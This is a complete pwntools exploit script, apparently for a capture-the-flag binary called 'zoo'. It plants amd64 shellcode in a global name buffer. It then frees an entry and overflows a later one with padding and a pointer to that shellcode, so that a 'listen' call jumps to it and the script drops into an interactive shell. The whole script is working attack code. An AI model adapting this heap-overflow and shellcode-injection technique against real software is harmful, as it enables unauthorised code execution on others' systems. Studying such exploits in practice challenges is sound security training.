from pwn import *
context(arch='amd64',os='linux')
context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

r = process('./zoo')

gdb.attach(r)

nameofzoo = 0x605420

def info_log():
    log.info('nameofzoo : '+hex(nameofzoo))
    log.info('adddog() : main+195')
    log.info('remove() : main+223')

def add(name,idx):
        r.sendlineafter(':', '1')
        r.sendlineafter(': ', name)
        r.sendlineafter(': ', str(idx))

        pause()

def listen(index):
        r.sendlineafter(':', '3')
        r.sendlineafter(': ', str(index))

        pause()

def remove(index):
        r.sendlineafter(':', '5')
        r.sendlineafter(': ', str(index))

        pause()

info_log()
shellcode = asm(shellcraft.amd64.sh())

payload = ''
payload += shellcode
payload += p64(nameofzoo)
r.sendlineafter(':', payload)

add('A' * 8, 2)
add('B' * 8, 3)
remove(0)

payload = ''
payload += 'C' * 72
payload += p64(nameofzoo + len(shellcode))
add(payload, 4)

listen(0)
r.interactive()
